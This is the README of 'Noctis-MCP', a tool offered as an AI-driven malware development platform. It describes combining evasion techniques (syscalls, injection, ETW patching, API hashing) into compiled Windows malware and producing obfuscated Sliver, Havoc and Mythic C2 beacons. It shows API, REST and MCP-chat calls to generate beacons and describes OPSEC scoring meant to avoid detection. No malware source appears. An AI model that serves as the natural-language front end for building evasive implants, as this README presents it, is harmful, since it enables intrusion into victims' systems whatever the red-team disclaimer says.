# Noctis-MCP

**AI-Driven Malware Development Platform with C2 Integration**

[![Python](https://img.shields.io/badge/python-3.11+-blue.svg)](https://www.python.org/downloads/)
[![Platform](https://img.shields.io/badge/platform-Linux%20%7C%20Windows-lightgrey)](https://github.com/Yenn503/Noctis-MCP)
[![Tests](https://img.shields.io/badge/tests-49%20passing-success)](https://github.com/Yenn503/Noctis-MCP)
[![License](https://img.shields.io/badge/license-MIT-green)](LICENSE)

**Legal Disclaimer**: This tool is designed exclusively for authorized security research, penetration testing, and red team operations. Unauthorized use of malware development tools is illegal. Users assume full responsibility for compliance with applicable laws.

---

## Overview

Noctis-MCP is a malware development framework that combines:

- **Technique Library**: 126+ indexed techniques from MaldevAcademy and community sources
- **Code Generation**: Intelligent assembly of techniques into working C/C++ code
- **Cross-Platform Compilation**: MSBuild (Windows) and MinGW (Linux)
- **C2 Integration**: Native support for Sliver, Havoc, and Mythic frameworks
- **Obfuscation Pipeline**: String encryption, API hashing, polymorphic code generation
- **AI Interface**: MCP (Model Context Protocol) integration for natural language interaction

### Key Capabilities

| Feature | Description |
|---------|-------------|
| **Code Generation** | Combine multiple evasion techniques into working malware |
| **Compilation** | Automatic compilation with MSBuild or MinGW |
| **C2 Frameworks** | Generate beacons for Sliver, Havoc, Mythic |
| **Obfuscation** | String encryption, API hashing, control flow flattening |
| **Cross-Platform** | Windows native, Linux cross-compilation |
| **OPSEC Analysis** | Automated security posture scoring |

---

## Quick Start

### Prerequisites

- Python 3.11 or higher
- **Compiler** (for Windows malware compilation):
  - **Linux**: MinGW-w64 (auto-installed by setup.sh)
  - **macOS**: MinGW-w64 (install via Homebrew - see below)
  - **Windows**: Visual Studio Build Tools 2019+ (detected by setup.ps1)

### Installation

**Linux:**
```bash
# Clone repository
git clone https://github.com/Yenn503/Noctis-MCP.git
cd Noctis-MCP

# Run automated setup (auto-installs MinGW)
chmod +x setup.sh
./setup.sh

# Verify installation
python verify_setup.py
```

**macOS:**
```bash
# Clone repository
git clone https://github.com/Yenn503/Noctis-MCP.git
cd Noctis-MCP

# ⚠️  IMPORTANT: Install MinGW via Homebrew first
brew install mingw-w64

# Run automated setup (Python dependencies)
chmod +x setup.sh
./setup.sh

# Verify installation
python verify_setup.py
```

**Note for macOS:** The setup.sh script will work but won't auto-install MinGW (requires Homebrew). You must install it manually first.

**Windows:**
```powershell
# Clone repository (PowerShell or CMD)
git clone https://github.com/Yenn503/Noctis-MCP.git
cd Noctis-MCP

# Run automated setup (double-click setup.bat or run in PowerShell)
.\setup.bat
# OR directly:
powershell -ExecutionPolicy Bypass -File setup.ps1

# Verify installation
python verify_setup.py
```

### First Steps

```bash
# Activate virtual environment
source venv/bin/activate  # Linux
# venv\Scripts\activate  # Windows

# Start API server
python server/noctis_server.py

# Server runs on http://localhost:5000
```

### Basic Usage

**Python API:**
```python
from c2_adapters import generate_sliver_beacon

result = generate_sliver_beacon(
    listener_host="192.168.1.100",
    listener_port=443,
    protocol="https",
    techniques=["NOCTIS-T124"],  # API hashing
    obfuscate=True
)

print(f"Beacon: {result.beacon_path}")
print(f"OPSEC Score: {result.opsec_score}/10")
```

**REST API:**
```bash
curl -X POST http://localhost:5000/api/c2/sliver/generate \
  -H "Content-Type: application/json" \
  -d '{
    "listener_host": "192.168.1.100",
    "listener_port": 443,
    "protocol": "https",
    "obfuscate": true
  }'
```

**AI Chat (via MCP):**
```
generate_sliver_beacon(
    listener_host="192.168.1.100",
    listener_port=443,
    protocol="https",
    obfuscate=True
)
```

---

## Architecture

```
┌─────────────────────┐
│   AI Interface      │  ← Natural language requests
│   (MCP Client)      │
└──────────┬──────────┘
           │ HTTP/REST
           ↓
┌─────────────────────┐
│   API Server        │  ← Flask REST API
│   (noctis_server)   │
└──────────┬──────────┘
           │
    ┌──────┴──────┬────────────┬──────────────┐
    ↓             ↓            ↓              ↓
┌────────┐  ┌──────────┐  ┌─────────┐  ┌──────────┐
│Technique│  │   Code   │  │Compiler │  │    C2    │
│ Library │  │Assembler │  │ Engine  │  │ Adapters │
└────────┘  └──────────┘  └─────────┘  └──────────┘
   126+        Smart       MSBuild/      Sliver/
techniques   Assembly      MinGW        Havoc/Mythic
```

### Core Components

**1. Technique Library** (`techniques/`)
- 126+ techniques from MaldevAcademy, TheSilencer, and community
- JSON metadata with MITRE ATT&CK mappings
- Categories: API hashing, syscalls, injection, persistence, encryption

**2. Code Assembler** (`server/code_assembler.py`)
- Intelligent function extraction from source files
- Dependency resolution and deduplication
- Conflict detection between incompatible techniques

**3. Compilation** (`compilation/`)
- Windows: MSBuild integration
- Linux: MinGW-w64 cross-compilation
- Automatic architecture detection
- Multi-file project support

**4. C2 Adapters** (`c2_adapters/`)
- Sliver: HTTPS, DNS, mTLS beacons
- Havoc: Ekko/Foliage sleep obfuscation, indirect syscalls
- Mythic: Apollo, Poseidon, Merlin agents

**5. Obfuscation** (`server/obfuscation/`)
- String encryption (XOR, AES, RC4)
- API hashing (DJB2, ROT13+XOR, CRC32)
- Control flow flattening
- Polymorphic code generation

---

## Documentation

| Document | Purpose |
|----------|---------|
| [ARCHITECTURE.md](docs/ARCHITECTURE.md) | Technical architecture and design |
| [GETTING_STARTED.md](docs/GETTING_STARTED.md) | Installation and configuration |
| [USER_GUIDE.md](docs/USER_GUIDE.md) | Complete usage guide |
| [API_REFERENCE.md](docs/API_REFERENCE.md) | API documentation |
| [C2_INTEGRATION.md](docs/C2_INTEGRATION.md) | C2 framework setup |
| [CONTRIBUTING.md](docs/CONTRIBUTING.md) | Contributing guide |

---

## Features

### Malware Techniques

| Category | Techniques | Source |
|----------|------------|--------|
| API Obfuscation | DJB2 hashing, ROT13+XOR, CRC32 | MaldevAcademy |
| Syscalls | HellsHall, Trap flag, Indirect | MaldevAcademy |
| Injection | RunPE, APC, Thread pool | MaldevAcademy |
| Evasion | GPU hiding, Stack spoofing, VEH manipulation | MaldevAcademy |
| Encryption | CT-AES, AES-NI, XOR, RC4 | MaldevAcademy |
| Steganography | DWT PNG embedding | MaldevAcademy |
| Unhooking | DLL unhooking, ETW patching | MaldevAcademy |

### C2 Frameworks

**Sliver**
- Protocols: HTTPS, HTTP, DNS, TCP, mTLS
- Features: Beacon/Session modes, shellcode, exe, dll formats
- Integration: Full API support

**Havoc**
- Sleep Obfuscation: Ekko, Foliage, WaitForSingleObjectEx
- Features: Indirect syscalls, stack duplication, sleep masking
- Integration: Teamserver API

**Mythic**
- Agents: Apollo, Poseidon, Merlin, Apfell, Atlas
- Profiles: HTTP, HTTPS, WebSocket, DNS, SMB
- Integration: REST API, Docker deployment

---

## Project Statistics

| Metric | Value |
|--------|-------|
| Total Code | ~18,000 lines |
| Techniques | 126+ indexed |
| C2 Frameworks | 3 (Sliver, Havoc, Mythic) |
| MCP Tools | 14 AI-accessible |
| Tests | 186 total, 49 integration |
| Test Pass Rate | 100% |
| Compilers | 2 (MSBuild, MinGW) |
| Supported Platforms | Windows, Linux |

---

## Requirements

### System Requirements
- **OS**: Windows 10/11 or Linux (Ubuntu, Debian, Kali)
- **Python**: 3.11 or higher
- **Memory**: 4GB minimum, 8GB recommended
- **Disk**: 2GB free space

### Compiler Requirements

**Windows:**
```powershell
# Visual Studio Build Tools 2019+
winget install Microsoft.VisualStudio.2022.BuildTools
```

**Linux:**
```bash
# MinGW-w64
sudo apt update
sudo apt install mingw-w64
```

### Python Dependencies
```bash
pip install -r requirements.txt
```

Core dependencies: Flask, FastMCP, requests, cryptography, pycryptodome, pytest

---

## Testing

```bash
# Run all tests
python -m pytest tests/ -v

# Run specific test suite
python -m pytest tests/test_sliver_integration.py -v

# Test compilation
python test_mingw_simple.py
```

**Test Coverage:**
- Sliver integration: 4 tests
- Havoc integration: 15 tests
- Mythic integration: 13 tests
- Compilation: 12 tests
- Base adapters: 5 tests

---

## Security Considerations

### OPSEC Analysis

Noctis-MCP includes built-in OPSEC scoring:

```python
from server.opsec_analyzer import analyze_opsec

result = analyze_opsec(binary_path="loader.exe")
print(f"Score: {result['score']}/10")
print(f"Issues: {result['issues']}")
```

Analysis includes:
- String analysis (suspicious API names, debug strings)
- Import table scanning (exposed imports)
- Entropy calculation (encrypted sections)
- Memory pattern detection
- Known signature matching

### Best Practices

1. **Development Environment**: Use isolated VMs
2. **Testing**: Never test on production systems
3. **Authorization**: Obtain written permission
4. **Logging**: Maintain audit trail
5. **Storage**: Encrypt generated artifacts

---

## License

MIT License - See [LICENSE](LICENSE) for details.

**Important**: While this framework is open source, generated malware is subject to legal restrictions. Users are solely responsible for compliance with all applicable laws.

---

## Contributing

Contributions are welcome! See [CONTRIBUTING.md](docs/CONTRIBUTING.md) for:
- Code style guidelines
- Testing requirements
- Pull request process
- Adding new techniques

---

## Acknowledgments

- **MaldevAcademy**: Technique examples and loaders
- **HexStrike AI**: Inspiration for MCP architecture
- **Security Community**: Continuous innovation in evasion techniques

---

## Contact

- **Repository**: https://github.com/Yenn503/Noctis-MCP
- **Issues**: https://github.com/Yenn503/Noctis-MCP/issues
- **Documentation**: See `docs/` directory

---

**Status**: Production Ready (Phase 4 Complete)  
**Version**: 1.0.0  
**Last Updated**: October 3, 2025
